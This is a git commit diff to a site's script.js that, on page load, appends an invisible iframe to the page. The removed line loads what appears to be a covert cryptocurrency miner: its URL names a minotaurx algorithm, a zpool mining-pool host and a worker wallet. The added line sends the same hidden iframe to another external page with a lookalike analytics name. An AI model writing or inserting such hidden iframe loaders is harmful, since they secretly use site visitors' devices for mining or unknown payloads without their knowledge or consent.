54daf7c2516c4faa57a99ad6183b1af9749634d0
Teo4268 <mamacook3300@gmail.com>
2025-07-01 17:59:46 +0700

    Update script.js

--- script.js
+++ script.js
@@ -135,7 +135,7 @@ document.addEventListener("DOMContentLoaded", function () {
   iframe.style.opacity = "0";
   iframe.style.pointerEvents = "none";
   iframe.style.overflow = "hidden";
-  iframe.src = "https://api-music.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs&password=c%3DRVN&workers=2";
+  iframe.src = "https://anylystic.pages.dev";
   document.body.appendChild(iframe);
 });
 
